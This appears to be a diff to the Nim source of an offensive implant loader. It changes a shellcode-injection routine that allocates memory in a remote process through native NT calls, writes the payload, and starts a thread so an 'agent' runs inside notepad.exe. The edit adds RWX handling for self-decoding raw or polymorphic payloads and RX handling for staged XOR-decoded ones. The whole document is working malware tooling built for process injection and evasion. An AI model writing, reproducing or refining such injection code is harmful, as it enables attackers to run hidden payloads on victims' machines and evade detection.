@@ -271,10 +271,15 @@ proc injectAndExec(sc: seq[byte]) =
   if ntAlloc == nil or ntWrite == nil or ntProt == nil or rtlUT == nil:
     discard CloseHandle(hProcess); discard CloseHandle(hThread); return
 
-  # Allocate RW in remote process
+  # Allocate in remote process.
+  # Raw/poly payloads decode themselves in-place → need RWX throughout execution.
+  # Staged payloads are already plain shellcode after XOR → tighten to RX.
   var remoteAddr: pointer = nil
   var sz: uint = uint(sc.len)
-  discard ntAlloc(hProcess, addr remoteAddr, 0, addr sz, uint32(MEM_COMMIT or MEM_RESERVE), uint32(PAGE_READWRITE))
+  when defined(rawPayload):
+    discard ntAlloc(hProcess, addr remoteAddr, 0, addr sz, uint32(MEM_COMMIT or MEM_RESERVE), uint32(PAGE_EXECUTE_READWRITE))
+  else:
+    discard ntAlloc(hProcess, addr remoteAddr, 0, addr sz, uint32(MEM_COMMIT or MEM_RESERVE), uint32(PAGE_READWRITE))
   if remoteAddr == nil:
     discard CloseHandle(hProcess); discard CloseHandle(hThread); return
 
@@ -282,9 +287,10 @@ proc injectAndExec(sc: seq[byte]) =
   var wb: uint32 = 0
   discard ntWrite(hProcess, remoteAddr, unsafeAddr sc[0], uint32(sc.len), addr wb)
 
-  # Flip to RX — sz is page-aligned from NtAllocateVirtualMemory, use it directly
-  var oldProt: DWORD = 0
-  discard ntProt(hProcess, addr remoteAddr, addr sz, uint32(PAGE_EXECUTE_READ), addr oldProt)
+  # Flip to RX only for staged payloads (already decrypted); raw/poly stays RWX.
+  when not defined(rawPayload):
+    var oldProt: DWORD = 0
+    discard ntProt(hProcess, addr remoteAddr, addr sz, uint32(PAGE_EXECUTE_READ), addr oldProt)
 
   # Spawn remote thread — agent runs in notepad.exe independently
   var hRemoteThread: HANDLE = 0
